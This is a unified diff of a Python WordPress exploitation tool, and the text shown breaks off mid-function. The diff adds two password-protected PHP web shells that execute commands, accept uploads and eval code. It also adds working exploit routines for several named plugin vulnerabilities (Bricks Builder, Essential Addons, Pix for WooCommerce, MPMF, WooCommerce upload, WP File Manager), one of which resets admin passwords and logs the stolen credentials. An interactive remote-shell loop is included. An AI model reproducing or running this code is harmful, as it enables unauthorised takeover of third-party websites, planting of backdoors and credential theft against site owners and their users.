@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import requests
 import re
 import time
@@ -5,16 +6,20 @@ import os
 import sys
 import json
 import random
-import string
+import base64
+import threading
+import argparse
 from urllib.parse import urljoin, urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
-import threading
-import zipfile
-import tempfile
-import hashlib
-from datetime import datetime
+from bs4 import BeautifulSoup
+from rich.console import Console
+from prompt_toolkit import PromptSession, HTML
+from prompt_toolkit.history import InMemoryHistory
+from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+from alive_progress import alive_bar
 
+# Color setup
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -22,728 +27,568 @@ BLUE = "\033[94m"
 MAGENTA = "\033[95m"
 CYAN = "\033[96m"
 WHITE = "\033[97m"
-PINK = "\033[95m"
-GREY = "\033[90m"
 BOLD = "\033[1m"
 RESET = "\033[0m"
 
+color = Console()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-SHELL_PASSWORD = "aezeron"
+# Global variables
+SHELL_PASSWORD = "K3ysTr0K3R_2024"
 
-# Simple test shell that echoes a unique ID
-def create_test_shell(shell_id):
-    return f"""<?php
-$id = "{shell_id}";
+# Powerful PHP Shell
+POWERFUL_SHELL = f"""<?php
 $p = "{SHELL_PASSWORD}";
-if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_REQUEST['cmd'])){{
-    echo "SHELL_ID:" . $id . "\\n";
-    system($_REQUEST['cmd']);
-    die;
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{
+        $c = base64_decode($_REQUEST['cmd']);
+        if(function_exists('system')){{ system($c); }}
+        elseif(function_exists('exec')){{ exec($c,$o); echo implode("\\n",$o); }}
+        elseif(function_exists('shell_exec')){{ echo shell_exec($c); }}
+        elseif(function_exists('passthru')){{ passthru($c); }}
+        die;
+    }}
+    if(isset($_FILES['f'])){{
+        move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
+        echo "Uploaded: " . $_FILES['f']['name'];
+        die;
+    }}
+    if(isset($_POST['code'])){{
+        eval(base64_decode($_POST['code']));
+        die;
+    }}
+    if(isset($_REQUEST['info'])){{
+        phpinfo();
+        die;
+    }}
+    echo "Shell Active";
 }}
-if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_REQUEST['test'])){{
-    echo "SHELL_ID:" . $id . " - WORKING";
-    die;
-}}
-echo "Shell requires password";
 ?>"""
 
-# Reliable shell for actual exploitation
-RELIABLE_SHELL = f"""<?php
-$p = "{SHELL_PASSWORD}";
-if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_REQUEST['cmd'])){{
-    $cmd = $_REQUEST['cmd'];
-    $output = '';
-    if(function_exists('system')){{ ob_start(); system($cmd); $output = ob_get_clean(); }}
-    elseif(function_exists('exec')){{ exec($cmd, $out); $output = implode("\\n", $out); }}
-    elseif(function_exists('shell_exec')){{ $output = shell_exec($cmd); }}
-    echo $output;
-    die;
+# Simple shell for initial upload
+SIMPLE_SHELL = f"""<?php
+$p="{SHELL_PASSWORD}";
+if(isset($_REQUEST['p'])&&$_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{ system(base64_decode($_REQUEST['cmd'])); die; }}
+    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
+    if(isset($_POST['code'])){{ eval(base64_decode($_POST['code'])); die; }}
+    echo "Shell Active";
 }}
-if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_REQUEST['info'])){{
-    echo "PHP: " . phpversion() . " | OS: " . PHP_OS . " | User: " . get_current_user();
-    die;
-}}
-echo "Shell ready - use ?p={SHELL_PASSWORD}&cmd=whoami";
 ?>"""
 
-class WPExploitScanner:
+headers = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
+}
+
+# Bricks Builder paths
+BRICKS_PATHS = [
+    "/wp-json/bricks/v1/render_element",
+    "/?rest_route=/bricks/v1/render_element"
+]
+
+class WordPressExploiter:
     def __init__(self):
         self.session = requests.Session()
         self.session.verify = False
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': '*/*',
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive',
         })
-        self.results = []
-        self.start_time = datetime.now()
-
-    def log(self, message, level="INFO"):
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        if level == "SUCCESS":
-            print(f"{GREEN}[{timestamp}][+]{RESET} {message}")
-        elif level == "ERROR":
-            print(f"{RED}[{timestamp}][-]{RESET} {message}")
-        elif level == "EXPLOIT":
-            print(f"{MAGENTA}[{timestamp}][!]{RESET} {message}")
-        elif level == "DEBUG":
-            print(f"{GREY}[{timestamp}][D]{RESET} {message}")
+    
+    def verify_shell(self, url, retries=3):
+        """Verify if shell is working with actual command execution"""
+        for attempt in range(retries):
+            try:
+                test_cmd = base64.b64encode(b'echo SHELL_TEST_12345').decode()
+                test_url = f"{url}?p={SHELL_PASSWORD}&cmd={test_cmd}"
+                
+                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
+                
+                if resp.status_code == 200:
+                    try:
+                        decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
+                        if 'SHELL_TEST_12345' in decoded:
+                            return True
+                    except:
+                        if 'SHELL_TEST_12345' in resp.text or 'Shell Active' in resp.text:
+                            return True
+                
+                resp2 = self.session.get(f"{url}?p={SHELL_PASSWORD}", timeout=10)
+                if resp2.status_code == 200:
+                    if 'Shell Active' in resp2.text or 'Enhanced Web Shell' in resp2.text:
+                        return True
+                        
+                time.sleep(1)
+            except:
+                continue
+        
+        return False
+    
+    def fetch_bricks_nonce(self, target):
+        """Fetch nonce for Bricks Builder exploit"""
+        try:
+            response = self.session.get(target, timeout=10)
+            response.raise_for_status()
+            soup = BeautifulSoup(response.text, "html.parser")
+            script_tag = soup.find("script", id="bricks-scripts-js-extra")
+            if script_tag:
+                match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
+                if match:
+                    return match.group(1)
+            return None
+        except Exception:
+            return None
+    
+    def create_bricks_element(self, nonce, command=None):
+        """Create element for Bricks Builder exploit"""
+        if command:
+            return {
+                "postId": "1",
+                "nonce": nonce,
+                "element": {
+                    "name": "code",
+                    "settings": {
+                        "executeCode": "true",
+                        "code": f"<?php throw new Exception(`{command}`);?>"
+                    }
+                }
+            }
         else:
-            print(f"{CYAN}[{timestamp}][*]{RESET} {message}")
-
-    def verify_shell(self, url, shell_id=None):
-        """Verify shell is actually working"""
+            return {
+                "postId": "1",
+                "nonce": nonce,
+                "element": {
+                    "name": "container",
+                    "settings": {
+                        "hasLoop": "true",
+                        "query": {
+                            "useQueryEditor": True,
+                            "queryEditor": "throw new Exception(`echo SHELL_TEST_12345`);",
+                            "objectType": "post"
+                        }
+                    }
+                }
+            }
+    
+    def exploit_bricks_builder(self, target_url):
+        """CVE-2024-25600 - Bricks Builder RCE"""
+        print(f"  {CYAN}[*]{RESET} Exploiting Bricks Builder (CVE-2024-25600)...")
+        
+        nonce = self.fetch_bricks_nonce(target_url)
+        if not nonce:
+            print(f"    {RED}[-]{RESET} Could not fetch nonce")
+            return False, None
+        
+        print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
+        
+        # Test vulnerability
+        test_element = self.create_bricks_element(nonce)
+        
+        for path in BRICKS_PATHS:
+            try:
+                resp = self.session.post(target_url + path, json=test_element, timeout=10)
+                
+                if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
+                    print(f"    {GREEN}[✓]{RESET} Target is vulnerable!")
+                    
+                    # Try to upload shell using command execution
+                    shell_name = f"shell_{random.randint(1000,9999)}.php"
+                    
+                    # Create PHP file using echo command
+                    encoded_shell = base64.b64encode(SIMPLE_SHELL.encode()).decode()
+                    create_cmd = f"echo '{encoded_shell}' | base64 -d > {shell_name}"
+                    
+                    cmd_element = self.create_bricks_element(nonce, create_cmd)
+                    resp = self.session.post(target_url + path, json=cmd_element, timeout=10)
+                    
+                    if resp.status_code == 200:
+                        shell_url = urljoin(target_url, shell_name)
+                        if self.verify_shell(shell_url):
+                            print(f"    {GREEN}[✓]{RESET} Shell uploaded and verified!")
+                            print(f"    {CYAN}[→]{RESET} URL: {shell_url}")
+                            return True, shell_url
+                    
+                    return False, None
+            except:
+                continue
+        
+        return False, None
+    
+    def exploit_cve_2023_32243(self, target_url):
+        """CVE-2023-32243 - Essential Addons for Elementor Authentication Bypass"""
+        print(f"  {CYAN}[*]{RESET} Exploiting CVE-2023-32243...")
+        
+        clean_url = target_url.replace('http://', '').replace('https://', '')
+        
         try:
-            # Test with test parameter
-            test_url = f"{url}?p={SHELL_PASSWORD}&test=1"
-            resp = self.session.get(test_url, timeout=10)
+            # Get username
+            user = None
             
-            if resp.status_code == 200:
-                if shell_id and f"SHELL_ID:{shell_id}" in resp.text:
-                    self.log(f"Shell verified with ID: {shell_id}", "SUCCESS")
-                    return True
-                if "Shell ready" in resp.text or "requires password" in resp.text:
-                    # Test actual command execution
-                    cmd_url = f"{url}?p={SHELL_PASSWORD}&cmd=echo%20WORKING"
-                    cmd_resp = self.session.get(cmd_url, timeout=10)
-                    if cmd_resp.status_code == 200 and "WORKING" in cmd_resp.text:
-                        self.log(f"Command execution verified", "SUCCESS")
-                        return True
-                    # Also try info endpoint
-                    info_url = f"{url}?p={SHELL_PASSWORD}&info=1"
-                    info_resp = self.session.get(info_url, timeout=10)
-                    if info_resp.status_code == 200 and ("PHP:" in info_resp.text or "OS:" in info_resp.text):
-                        return True
-            return False
+            try:
+                resp = self.session.get(f'http://{clean_url}/wp-json/wp/v2/users', timeout=10)
+                if '"slug":"' in resp.text:
+                    users = re.findall('"slug":"(.*?)"', resp.text)
+                    if users:
+                        user = users[0]
+                        print(f"    {GREEN}[+]{RESET} Username found: {user}")
+            except:
+                pass
+            
+            if not user:
+                try:
+                    resp = self.session.get(f'http://{clean_url}/author-sitemap.xml', timeout=10)
+                    if 'Sitemap' in resp.text:
+                        users = re.findall('author/(.*?)/', resp.text)
+                        if users:
+                            user = users[0]
+                            print(f"    {GREEN}[+]{RESET} Username found: {user}")
+                except:
+                    pass
+            
+            if not user:
+                print(f"    {RED}[-]{RESET} Could not find username")
+                return False, None
+            
+            # Get nonce
+            response = self.session.get(f'http://{clean_url}', timeout=10).text
+            nonce_match = re.findall('admin-ajax.php","nonce":"(.*?)"', response)
+            if not nonce_match:
+                print(f"    {RED}[-]{RESET} Could not find nonce")
+                return False, None
+            
+            nonce = nonce_match[0]
+            
+            # Reset password
+            payload = {
+                "action": "login_or_register_user",
+                "eael-resetpassword-submit": "true",
+                "page_id": "124",
+                "widget_id": "224",
+                "eael-resetpassword-nonce": nonce,
+                "eael-pass1": SHELL_PASSWORD,
+                "eael-pass2": SHELL_PASSWORD,
+                "rp_login": user
+            }
+            
+            resp = self.session.post(f'http://{clean_url}/wp-admin/admin-ajax.php', data=payload, timeout=10)
+            
+            if 'success":true' in resp.text:
+                print(f"    {GREEN}[✓]{RESET} Password reset successful!")
+                print(f"    {CYAN}[→]{RESET} Login: http://{clean_url}/wp-login.php | {user}:{SHELL_PASSWORD}")
+                
+                with open('cve_2023_32243_results.txt', 'a') as f:
+                    f.write(f"http://{clean_url}/wp-login.php|{user}|{SHELL_PASSWORD}\n")
+                
+                return True, f"Credentials: {user}:{SHELL_PASSWORD}"
+            else:
+                return False, None
+                
         except Exception as e:
-            self.log(f"Shell verification error: {str(e)}", "DEBUG")
-            return False
-
-    def check_url_access(self, url):
-        """Check if URL is accessible"""
-        try:
-            resp = self.session.get(url, timeout=10)
-            return resp.status_code == 200
-        except:
-            return False
-
-    def detect_mpmf_endpoint(self, target_url):
-        """Enhanced MPMF endpoint detection"""
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
+            return False, None
+    
+    def exploit_pix_woocommerce(self, target_url):
+        """CVE-2026-3891 - Pix for WooCommerce RCE"""
+        print(f"  {CYAN}[*]{RESET} Exploiting Pix for WooCommerce...")
+        
         base_url = target_url.rstrip('/')
         
-        endpoint_patterns = [
-            f"{base_url}/mpmf-1/",
-            f"{base_url}/mpmf/",
-            f"{base_url}/multi-purpose-multi-forms/mpmf-1/",
-            f"{base_url}/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/",
-            f"{base_url}/index.php/mpmf-1/",
-            f"{base_url}/wp-content/uploads/mpmf_uploads/",
-        ]
-        
-        for endpoint in endpoint_patterns:
-            try:
-                resp = self.session.get(endpoint, timeout=5)
-                if resp.status_code == 200:
-                    content = resp.text.lower()
-                    if any(x in content for x in ['mpmf', 'form_name', 'mpmf_form_id', 'custom_form_action']):
-                        self.log(f"Found MPMF endpoint: {endpoint}", "DEBUG")
-                        return endpoint
-            except:
-                continue
-        
-        # Try to find from main page
         try:
-            resp = self.session.get(base_url, timeout=5)
-            if resp.status_code == 200:
-                form_actions = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
-                for action in form_actions:
-                    if 'mpmf' in action.lower() or 'form' in action.lower():
-                        full_url = urljoin(base_url, action)
-                        self.log(f"Found potential MPMF form: {full_url}", "DEBUG")
-                        return full_url
-        except:
-            pass
-        
-        return None
-
-    def detect_form_name(self, endpoint_url):
-        """Detect form name from endpoint"""
-        if not endpoint_url:
-            return 'hkh'
-        
-        try:
-            resp = self.session.get(endpoint_url, timeout=5)
-            if resp.status_code == 200:
-                # Look for form_name in hidden inputs
-                hidden_matches = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']form_name["\'][^>]+value=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
-                if hidden_matches:
-                    self.log(f"Found form_name in hidden input: {hidden_matches[0]}", "DEBUG")
-                    return hidden_matches[0]
-                
-                # Look for form_name in JavaScript
-                js_matches = re.findall(r'form_name["\']?\s*:\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
-                if js_matches:
-                    self.log(f"Found form_name in JS: {js_matches[0]}", "DEBUG")
-                    return js_matches[0]
-        except:
-            pass
-        
-        return 'hkh'
-
-    def exploit_mpmf_rce(self, target_url):
-        """Exploit MPMF RCE with actual verification"""
-        self.log(f"Testing MPMF RCE on {target_url}", "INFO")
-        
-        endpoint = self.detect_mpmf_endpoint(target_url)
-        if not endpoint:
-            self.log("MPMF endpoint not found", "ERROR")
-            return None
-        
-        form_name = self.detect_form_name(endpoint)
-        self.log(f"Using endpoint: {endpoint}", "DEBUG")
-        self.log(f"Using form name: {form_name}", "DEBUG")
-        
-        # Generate unique shell ID for verification
-        shell_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
-        shell_name = f"sh_{shell_id}.php"
-        shell_content = create_test_shell(shell_id)
-        
-        # Determine base URL
-        if '/wp-content/' in endpoint:
-            base_url = endpoint.split('/wp-content/')[0] + '/'
-        else:
-            base_url = target_url.rstrip('/') + '/'
-        
-        # Try multiple upload methods
-        upload_methods = [
-            # Method 1: Standard file upload
-            {
-                "files": {"file1": (shell_name, shell_content, "application/x-php")},
-                "data": {
-                    "form_name": form_name,
-                    "field_label1": "",
-                    "countcalculated": "1",
-                    "count_files": "1",
-                    "count": "2",
-                    "mpmf_form_id": "1",
-                    "custom_form_action": "send_data",
-                    "send": "Submit",
-                }
-            },
-            # Method 2: Different field name
-            {
-                "files": {"upload_file": (shell_name, shell_content, "application/x-php")},
-                "data": {
-                    "form_name": form_name,
-                    "action": "upload",
-                    "mpmf_form_id": "1",
-                }
-            },
-            # Method 3: Using files array
-            {
-                "files": {"files[]": (shell_name, shell_content, "application/x-php")},
-                "data": {
-                    "form_name": form_name,
-                    "mpmf_form_id": "1",
-                    "custom_form_action": "upload_files",
-                }
-            },
-        ]
-        
-        possible_paths = [
-            f"{base_url}wp-content/uploads/mpmf_uploads/{shell_name}",
-            f"{base_url}wp-content/uploads/{shell_name}",
-            f"{base_url}wp-content/plugins/multi-purpose-multi-forms/files/{shell_name}",
-            f"{base_url}uploads/{shell_name}",
-            f"{base_url}{shell_name}",
-        ]
-        
-        for method_idx, method in enumerate(upload_methods):
-            self.log(f"Trying upload method {method_idx + 1}", "DEBUG")
-            
-            try:
-                response = self.session.post(endpoint, files=method["files"], data=method["data"], timeout=30)
-                self.log(f"Upload response status: {response.status_code}", "DEBUG")
-                
-                if response.status_code == 200:
-                    # Check each possible path for the shell
-                    for path in possible_paths:
-                        if self.check_url_access(path):
-                            if self.verify_shell(path, shell_id):
-                                self.log(f"MPMF Shell confirmed working: {path}?p={SHELL_PASSWORD}", "SUCCESS")
-                                # Upload the real shell
-                                real_shell_url = self.upload_real_shell(base_url, path)
-                                if real_shell_url:
-                                    return real_shell_url
-                                return f"{path}?p={SHELL_PASSWORD}"
-                            
-            except Exception as e:
-                self.log(f"Upload method {method_idx + 1} failed: {str(e)}", "DEBUG")
-                continue
-        
-        return None
-
-    def upload_real_shell(self, base_url, existing_shell_url):
-        """Upload the real functional shell using the existing shell"""
-        try:
-            # First, get the real shell content
-            real_shell = RELIABLE_SHELL
-            real_shell_name = f"aezeron_{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}.php"
-            
-            # Use the existing shell to upload the real shell
-            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
-                tmp.write(real_shell.encode())
-                tmp_path = tmp.name
-            
-            try:
-                # Try to upload via the existing shell
-                upload_url = f"{existing_shell_url}?p={SHELL_PASSWORD}"
-                with open(tmp_path, 'rb') as f:
-                    files = {'f': (real_shell_name, f, 'application/x-php')}
-                    resp = self.session.post(upload_url, files=files, timeout=30)
-                
-                if resp.status_code == 200:
-                    # Check if the real shell is accessible
-                    real_shell_url = f"{base_url}{real_shell_name}"
-                    if self.verify_shell(real_shell_url):
-                        self.log(f"Real shell uploaded successfully: {real_shell_url}", "SUCCESS")
-                        return real_shell_url
-            finally:
-                os.unlink(tmp_path)
-                
-        except Exception as e:
-            self.log(f"Real shell upload failed: {str(e)}", "DEBUG")
-        
-        return existing_shell_url
-
-    def exploit_pix_rce(self, target_url):
-        """Exploit Pix for WooCommerce RCE with verification"""
-        self.log(f"Testing Pix RCE on {target_url}", "INFO")
-        
-        base_url = target_url.rstrip("/")
-        shell_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
-        shell_name = f"pix_{shell_id}.php"
-        shell_content = create_test_shell(shell_id)
-        
-        # Try to get nonce
-        nonce = None
-        nonce_actions = [
-            "lkn_pix_for_woocommerce_generate_nonce",
-            "pix_generate_nonce",
-            "woocommerce_pix_nonce",
-        ]
-        
-        for action in nonce_actions:
-            try:
-                resp = self.session.post(
-                    f"{base_url}/wp-admin/admin-ajax.php",
-                    data={"action": action, "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce"},
-                    timeout=10
-                )
-                if resp.status_code == 200 and resp.text:
-                    try:
-                        data = resp.json()
-                        nonce = data.get("data", {}).get("nonce") or data.get("nonce")
-                        if nonce:
-                            self.log(f"Got nonce: {nonce[:20]}...", "DEBUG")
-                            break
-                    except:
-                        match = re.search(r'"nonce":"([^"]+)"', resp.text)
-                        if match:
-                            nonce = match.group(1)
-                            self.log(f"Extracted nonce: {nonce[:20]}...", "DEBUG")
-                            break
-            except:
-                continue
-        
-        if not nonce:
-            nonce = "pix_nonce_2024"
-            self.log("Using default nonce", "DEBUG")
-        
-        # Try to upload shell
-        file_fields = ["certificate_crt_path", "file", "upload_file"]
-        
-        possible_paths = [
-            f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{shell_name}",
-            f"{base_url}/wp-content/uploads/{shell_name}",
-            f"{base_url}/{shell_name}",
-        ]
-        
-        for file_field in file_fields:
-            self.log(f"Trying file field: {file_field}", "DEBUG")
-            
-            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
-                tmp.write(shell_content.encode())
-                tmp_path = tmp.name
-            
-            try:
-                data = {
-                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
-                    "_ajax_nonce": nonce,
-                    "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
-                }
-                
-                with open(tmp_path, "rb") as f:
-                    files = {file_field: (shell_name, f, "application/x-php")}
-                    upload_response = self.session.post(
-                        f"{base_url}/wp-admin/admin-ajax.php",
-                        data=data,
-                        files=files,
-                        timeout=30
-                    )
-                
-                self.log(f"Upload response status: {upload_response.status_code}", "DEBUG")
-                
-                if upload_response.status_code == 200:
-                    for path in possible_paths:
-                        if self.check_url_access(path):
-                            if self.verify_shell(path, shell_id):
-                                self.log(f"Pix Shell confirmed working: {path}?p={SHELL_PASSWORD}", "SUCCESS")
-                                # Upload the real shell
-                                real_shell_url = self.upload_real_shell(base_url, path)
-                                if real_shell_url:
-                                    return real_shell_url
-                                return f"{path}?p={SHELL_PASSWORD}"
-                            
-            finally:
-                os.unlink(tmp_path)
-        
-        return None
-
-    def exploit_woocommerce_rce(self, target_url):
-        """Exploit WooCommerce RCE with verification"""
-        self.log(f"Testing WooCommerce RCE on {target_url}", "INFO")
-        
-        base_url = target_url.rstrip("/")
-        shell_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
-        shell_name = f"woo_{shell_id}.php"
-        shell_content = create_test_shell(shell_id)
-        
-        files = {
-            "file": (shell_name, shell_content, "image/jpeg"),
-        }
-        
-        data = {
-            "action": "wc_upload_file_ajax",
-        }
-        
-        try:
-            response = self.session.post(
+            # Get nonce
+            nonce_resp = self.session.post(
                 f"{base_url}/wp-admin/admin-ajax.php",
-                files=files,
-                data=data,
-                timeout=30
+                data={"action": "lkn_pix_for_woocommerce_generate_nonce"},
+                timeout=10
             )
             
-            self.log(f"Upload response status: {response.status_code}", "DEBUG")
-            
-            if response.status_code == 200:
-                # Extract URL from response
-                url_match = re.search(r'(https?://[^\s"\'<>]+\.php)', response.text)
-                if url_match:
-                    shell_url = url_match.group(1)
-                    self.log(f"Found potential shell URL: {shell_url}", "DEBUG")
-                    
-                    if self.verify_shell(shell_url, shell_id):
-                        self.log(f"WooCommerce Shell confirmed working: {shell_url}?p={SHELL_PASSWORD}", "SUCCESS")
-                        # Upload the real shell
-                        real_shell_url = self.upload_real_shell(base_url, shell_url)
-                        if real_shell_url:
-                            return real_shell_url
-                        return f"{shell_url}?p={SHELL_PASSWORD}"
-                        
-        except Exception as e:
-            self.log(f"WooCommerce exploit error: {str(e)}", "ERROR")
-        
-        return None
-
-    def exploit_file_manager_rce(self, target_url):
-        """Exploit WP File Manager RCE with verification"""
-        self.log(f"Testing WP File Manager RCE on {target_url}", "INFO")
-        
-        base_url = target_url.rstrip("/")
-        endpoint = f"{base_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-        
-        try:
-            # Check if vulnerable
-            check = self.session.get(endpoint, timeout=5)
-            if check.status_code != 200:
-                self.log("File Manager endpoint not accessible", "DEBUG")
-                return None
-            
             try:
-                json_data = check.json()
-                if 'error' not in json_data or 'errUnknownCmd' not in str(json_data['error']):
-                    self.log("File Manager not vulnerable", "DEBUG")
-                    return None
+                nonce_data = nonce_resp.json()
+                nonce = nonce_data.get('data', {}).get('nonce')
+                if not nonce:
+                    return False, None
             except:
-                self.log("File Manager response not JSON", "DEBUG")
-                return None
+                return False, None
             
-            shell_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
-            shell_name = f"fm_{shell_id}.php"
-            shell_content = create_test_shell(shell_id)
+            # Upload shell
+            files = {
+                'certificate_crt_path': ('shell.php', SIMPLE_SHELL, 'application/x-php')
+            }
+            data = {
+                'action': 'lkn_pix_for_woocommerce_c6_save_settings',
+                '_ajax_nonce': nonce,
+                'settings': json.dumps({'enabled': 'yes'})
+            }
             
-            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
-                tmp.write(shell_content.encode())
-                tmp_path = tmp.name
+            resp = self.session.post(f"{base_url}/wp-admin/admin-ajax.php", files=files, data=data, timeout=30)
             
-            try:
-                files = {'upload[]': (shell_name, open(tmp_path, 'rb'), 'application/x-php')}
-                data = {
-                    'reqid': '17457a1fe6959',
-                    'cmd': 'upload',
-                    'target': 'l1_Lw',
-                    'mtime[]': '1576045135'
-                }
-                
-                response = self.session.post(endpoint, files=files, data=data, timeout=30)
-                self.log(f"Upload response status: {response.status_code}", "DEBUG")
-                
-                if response.status_code == 200:
-                    # Check possible locations
-                    possible_paths = [
-                        f"{base_url}/wp-content/plugins/wp-file-manager/lib/files/{shell_name}",
-                        f"{base_url}/wp-content/uploads/{shell_name}",
-                        f"{base_url}/{shell_name}",
-                    ]
-                    
-                    for path in possible_paths:
-                        if self.check_url_access(path):
-                            if self.verify_shell(path, shell_id):
-                                self.log(f"File Manager Shell confirmed working: {path}?p={SHELL_PASSWORD}", "SUCCESS")
-                                # Upload the real shell
-                                real_shell_url = self.upload_real_shell(base_url, path)
-                                if real_shell_url:
-                                    return real_shell_url
-                                return f"{path}?p={SHELL_PASSWORD}"
-                            
-            finally:
-                os.unlink(tmp_path)
-                
+            if resp.status_code == 200:
+                shell_url = f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php"
+                if self.verify_shell(shell_url):
+                    print(f"    {GREEN}[✓]{RESET} Shell verified!")
+                    return True, shell_url
+            
+            return False, None
         except Exception as e:
-            self.log(f"File Manager exploit error: {str(e)}", "ERROR")
+            return False, None
+    
+    def exploit_mpmf_rce(self, target_url):
+        """CVE-2024-50526 - MPMF RCE"""
+        print(f"  {CYAN}[*]{RESET} Exploiting MPMF RCE...")
         
-        return None
-
-    def scan_target(self, target_url):
-        """Scan a single target with all exploits"""
-        if not target_url.startswith('http'):
-            target_url = 'http://' + target_url
+        base_url = target_url.rstrip('/')
         
-        result = {
-            'url': target_url,
-            'timestamp': datetime.now().isoformat(),
-            'shells': [],
-            'success': False
+        # Detect form name
+        form_names = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
+        detected_form = None
+        
+        for fname in form_names:
+            try:
+                resp = self.session.get(f"{base_url}/?form_name={fname}", timeout=5)
+                if resp.status_code == 200 and 'mpmf' in resp.text.lower():
+                    detected_form = fname
+                    break
+            except:
+                continue
+        
+        if not detected_form:
+            return False, None
+        
+        # Upload shell
+        files = {
+            'file1': ('shell.php', SIMPLE_SHELL, 'application/x-php')
+        }
+        data = {
+            'form_name': detected_form,
+            'mpmf_form_id': '1',
+            'custom_form_action': 'send_data',
+            'send': 'Submit'
         }
         
-        self.log(f"Scanning {target_url}", "INFO")
+        try:
+            resp = self.session.post(f"{base_url}/mpmf-1/", files=files, data=data, timeout=30)
+            
+            if resp.status_code == 200:
+                test_paths = [
+                    f"{base_url}/wp-content/uploads/mpmf_uploads/shell.php",
+                    f"{base_url}/wp-content/uploads/shell.php",
+                    f"{base_url}/uploads/mpmf_uploads/shell.php",
+                ]
+                
+                for test_url in test_paths:
+                    if self.verify_shell(test_url):
+                        return True, test_url
+            
+            return False, None
+        except:
+            return False, None
+    
+    def exploit_woocommerce_upload(self, target_url):
+        """CVE-2024-51793 - WooCommerce Upload RCE"""
+        print(f"  {CYAN}[*]{RESET} Exploiting WooCommerce upload...")
         
-        # Try all exploits in order
+        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+        
+        files = {
+            'file': ('shell.php', SIMPLE_SHELL, 'image/jpeg')
+        }
+        data = {
+            'action': 'wc_upload_file_ajax'
+        }
+        
+        try:
+            resp = self.session.post(ajax_url, files=files, data=data, timeout=30)
+            
+            if resp.status_code == 200:
+                url_match = re.search(r'(https?://[^\s\'"<>]+\.php)', resp.text)
+                if url_match:
+                    shell_url = url_match.group(1)
+                    if self.verify_shell(shell_url):
+                        return True, shell_url
+            
+            return False, None
+        except:
+            return False, None
+    
+    def exploit_wp_file_manager(self, target_url):
+        """CVE-2020-25213 - WP File Manager RCE"""
+        print(f"  {CYAN}[*]{RESET} Exploiting WP File Manager...")
+        
+        connector_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
+        
+        try:
+            check_resp = self.session.get(connector_url, timeout=5)
+            if check_resp.status_code != 200:
+                return False, None
+            
+            shell_name = f"shell_{random.randint(1000,9999)}.php"
+            files = {
+                'upload[]': (shell_name, SIMPLE_SHELL, 'application/x-php')
+            }
+            data = {
+                'reqid': str(random.randint(10000,99999)),
+                'cmd': 'upload',
+                'target': 'l1_Lw'
+            }
+            
+            resp = self.session.post(connector_url, files=files, data=data, timeout=30)
+            
+            if resp.status_code == 200:
+                shell_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
+                if self.verify_shell(shell_url):
+                    return True, shell_url
+            
+            return False, None
+        except:
+            return False, None
+    
+    def interactive_bricks_shell(self, target_url, nonce):
+        """Interactive shell for Bricks Builder"""
+        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
+        print(f"  {YELLOW}[!]{RESET} Type 'exit' to quit\n")
+        
+        session = PromptSession(history=InMemoryHistory())
+        
+        while True:
+            try:
+                command = session.prompt(
+                    HTML("<ansired><b>BricksShell> </b></ansired>"),
+                    auto_suggest=AutoSuggestFromHistory(),
+                )
+                if command.lower() == "exit":
+                    break
+                
+                for path in BRICKS_PATHS:
+                    try:
+                        element = self.create_bricks_element(nonce, command)
